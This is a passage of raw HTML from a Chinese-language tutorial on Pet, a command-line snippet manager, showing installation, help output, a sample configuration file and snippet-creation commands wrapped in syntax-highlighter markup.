class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nyay -S pet-git\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127bcb756142353-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127bcb756142353-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93127bcb756142353-1\"><span class=\"crayon-v\">yay</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">S</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pet</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">git</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127bcb756142353-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>此外，你需要安装 <a href=\"https://github.com/junegunn/fzf\">fzf</a> 或 <a href=\"https://github.com/peco/peco\">peco</a> 工具以启用交互式搜索。请参阅官方 GitHub 链接了解如何安装这些工具。</p>\n<h3 id=\"toc_2\">用法</h3>\n<p>运行没有任何参数的 <code>pet</code> 来查看可用命令和常规选项的列表。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93127bce368589604\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ pet\r\npet - Simple command-line snippet manager.\r\n\r\nUsage:\r\n pet [command]\r\n\r\nAvailable Commands:\r\n configure Edit config file\r\n edit Edit snippet file\r\n exec Run the selected commands\r\n help Help about any command\r\n list Show all snippets\r\n new Create a new snippet\r\n search Search snippets\r\n sync Sync snippets\r\n version Print the version number\r\n\r\nFlags:\r\n --config string config file (default is $HOME/.config/pet/config.toml)\r\n --debug debug mode\r\n -h, --help help for pet\r\n\r\nUse \"pet [command] --help\" for more information about a command.\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127bce368589604-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127bce368589604-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127bce368589604-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127bce368589604-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127bce368589604-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127bce368589604-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127bce368589604-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127bce368589604-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127bce368589604-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127bce368589604-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127bce368589604-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127bce368589604-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127bce368589604-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127bce368589604-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127bce368589604-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127bce368589604-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127bce368589604-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127bce368589604-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127bce368589604-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127bce368589604-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127bce368589604-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127bce368589604-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127bce368589604-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127bce368589604-24\">24</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93127bce368589604-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">pet</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127bce368589604-2\"><span class=\"crayon-v\">pet</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Simple </span><span class=\"crayon-v\">command</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">line </span><span class=\"crayon-e\">snippet </span><span class=\"crayon-v\">manager</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93127bce368589604-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127bce368589604-4\"><span class=\"crayon-v\">Usage</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93127bce368589604-5\"><span class=\"crayon-h\"> </span><span class=\"crayon-i\">pet</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">command</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127bce368589604-6\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa93127bce368589604-7\"><span class=\"crayon-e\">Available </span><span class=\"crayon-v\">Commands</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127bce368589604-8\"><span class=\"crayon-h\"> </span><span class=\"crayon-e\">configure </span><span class=\"crayon-e\">Edit </span><span class=\"crayon-e\">config </span><span class=\"crayon-e\">file</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93127bce368589604-9\"><span class=\"crayon-e\"> </span><span class=\"crayon-e\">edit </span><span class=\"crayon-e\">Edit </span><span class=\"crayon-e\">snippet </span><span class=\"crayon-e\">file</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127bce368589604-10\"><span class=\"crayon-e\"> </span><span class=\"crayon-e\">exec </span><span class=\"crayon-e\">Run </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">selected </span><span class=\"crayon-e\">commands</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93127bce368589604-11\"><span class=\"crayon-e\"> </span><span class=\"crayon-e\">help </span><span class=\"crayon-e\">Help </span><span class=\"crayon-e\">about </span><span class=\"crayon-e\">any </span><span class=\"crayon-e\">command</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127bce368589604-12\"><span class=\"crayon-e\"> </span><span class=\"crayon-e\">list </span><span class=\"crayon-e\">Show </span><span class=\"crayon-e\">all </span><span class=\"crayon-e\">snippets</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93127bce368589604-13\"><span class=\"crayon-e\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Create</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">snippet</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127bce368589604-14\"><span class=\"crayon-e\"> </span><span class=\"crayon-e\">search </span><span class=\"crayon-e\">Search </span><span class=\"crayon-e\">snippets</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93127bce368589604-15\"><span class=\"crayon-e\"> </span><span class=\"crayon-e\">sync </span><span class=\"crayon-e\">Sync </span><span class=\"crayon-e\">snippets</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127bce368589604-16\"><span class=\"crayon-e\"> </span><span class=\"crayon-e\">version </span><span class=\"crayon-e\">Print </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">version </span><span class=\"crayon-e\">number</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93127bce368589604-17\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127bce368589604-18\"><span class=\"crayon-v\">Flags</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93127bce368589604-19\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">config </span><span class=\"crayon-t\">string</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">config </span><span class=\"crayon-e\">file</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-st\">default</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">HOME</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">config</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">pet</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">config</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">toml</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127bce368589604-20\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">debug </span><span class=\"crayon-e\">debug </span><span class=\"crayon-v\">mode</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93127bce368589604-21\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">h</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">help </span><span class=\"crayon-e\">help </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">pet</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127bce368589604-22\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa93127bce368589604-23\"><span class=\"crayon-st\">Use</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"pet [command] --help\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">more </span><span class=\"crayon-e\">information </span><span class=\"crayon-i\">about</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">command</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127bce368589604-24\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0028 seconds] -->\r\n<p>要查看特定命令的帮助部分，运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93127bd2547231547\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ pet [command] --help\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127bd2547231547-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127bd2547231547-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93127bd2547231547-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">pet</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">command</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-i\">help</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127bd2547231547-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p></p>\n<h4 id=\"toc_3\">配置 Pet</h4>\n<p>默认配置其实工作的挺好。但是，你可以更改保存片段的默认目录，选择要使用的选择器（fzf 或 peco），编辑片段的默认文本编辑器，添加 GIST id 详细信息等。</p>\n<p>要配置 Pet，运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93127be3098513434\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ pet configure\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127be3098513434-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127be3098513434-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93127be3098513434-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">pet </span><span class=\"crayon-i\">configure</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127be3098513434-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>该命令将在默认的文本编辑器中打开默认配置（例如我是 vim），根据你的要求更改或编辑特定值。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93127be8588471125\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[General]\r\n snippetfile = \"/home/sk/.config/pet/snippet.toml\"\r\n editor = \"vim\"\r\n column = 40\r\n selectcmd = \"fzf\"\r\n\r\n[Gist]\r\n file_name = \"pet-snippet.toml\"\r\n access_token = \"\"\r\n gist_id = \"\"\r\n public = false\r\n~\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127be8588471125-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127be8588471125-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127be8588471125-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127be8588471125-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127be8588471125-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127be8588471125-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127be8588471125-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127be8588471125-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127be8588471125-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127be8588471125-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127be8588471125-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127be8588471125-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127be8588471125-13\">13</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93127be8588471125-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">General</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127be8588471125-2\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">snippetfile</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"/home/sk/.config/pet/snippet.toml\"</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93127be8588471125-3\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">editor</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"vim\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127be8588471125-4\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">column</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">40</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93127be8588471125-5\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">selectcmd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"fzf\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127be8588471125-6\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa93127be8588471125-7\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">Gist</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127be8588471125-8\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">file_name</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"pet-snippet.toml\"</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93127be8588471125-9\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">access_token</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127be8588471125-10\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">gist_id</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"\"</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93127be8588471125-11\"><span class=\"crayon-h\"> </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127be8588471125-12\"><span class=\"crayon-o\">~</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93127be8588471125-13\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0014 seconds] -->\r\n<p></p>\n<h4 id=\"toc_4\">创建片段</h4>\n<p>为了创建一个新的片段，运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93127beb624074111\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ pet new\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div 